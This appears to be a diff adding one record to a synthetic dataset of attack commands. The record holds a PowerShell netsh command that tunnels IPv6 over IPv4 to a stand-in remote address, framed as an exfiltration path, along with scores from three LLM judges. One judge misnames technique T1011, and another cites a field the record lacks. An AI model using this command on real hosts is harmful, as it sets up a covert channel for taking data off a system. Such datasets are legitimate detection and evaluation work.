@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface ipv6 add v6v4tunnel exfiltun 192.0.2.25 198.51.100.25; netsh interface ipv6 add address exfiltun 2001:db8:100:1::2; netsh interface ipv6 add route 2001:db8:200::/48 exfiltun 2001:db8:100:1::1",
+  "explanation": "Creates a manual IPv6-over-IPv4 tunnel, assigns an IPv6 address, and routes a specific IPv6 prefix through it, establishing a controlled alternate exfiltration path (T1011).",
+  "rationale_steps": [
+    "Set up a named v6v4 tunnel to a remote host.",
+    "Bind an IPv6 address to the tunnel interface.",
+    "Add a targeted IPv6 route to steer exfil traffic through the tunnel using non-default addressing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-8444f983",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Three valid netsh commands are correctly separated by PowerShell semicolons with proper argument ordering and no quoting or flag issues.",
+        "semantic_score": 3,
+        "semantic_justification": "While the commands can establish an IPv6-over-IPv4 tunnel and route traffic, they require administrative privileges, use non-routable example addresses, and do not implement automation consistent with T1011.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:58:34.394102Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax for netsh commands, using correct semicolon separators between commands, valid parameters, and proper IPv4/IPv6 address formatting.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements a covert exfiltration channel using IPv6-over-IPv4 tunneling which aligns with T1011 (Automated Exfiltration), though it lacks the actual automation component for data transfer that would make it a complete implementation.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T01:58:38.430849Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct `netsh` syntax, valid command separators, and proper argument formats.",
+        "semantic_score": 3,
+        "semantic_justification": "While the commands correctly establish an IPv6-over-IPv4 tunnel and route, the claim of 'Privilege: None' is semantically incorrect as `netsh` commands for interface and route modification require administrator privileges, making it operationally implausible as stated.",
+        "combined_score": 4.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T01:58:51.146215Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
